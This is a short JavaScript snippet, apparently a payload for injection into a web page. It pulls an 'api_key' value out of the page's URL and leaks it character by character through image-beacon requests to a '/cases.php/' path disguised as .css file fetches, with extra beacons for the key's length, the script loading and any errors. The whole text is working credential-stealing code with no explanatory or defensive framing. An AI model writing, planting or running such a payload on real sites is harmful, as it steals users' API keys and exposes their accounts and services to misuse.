(function(){
 try{
  var b='/cases.php/';
  new Image().src=b+'PLRAN_1.css';
  var m=location.href.match(/api_key=([^&#"'\s]+)/);
  var k=m?decodeURIComponent(m[1]):"NONE";
  new Image().src=b+'KL_'+k.length+'.css';
  for(var i=0;i<k.length;i++){ new Image().src=b+'KX_'+i+'_'+k.charCodeAt(i)+'.css'; }
 }catch(e){ new Image().src='/cases.php/PLERR.css'; }
})();
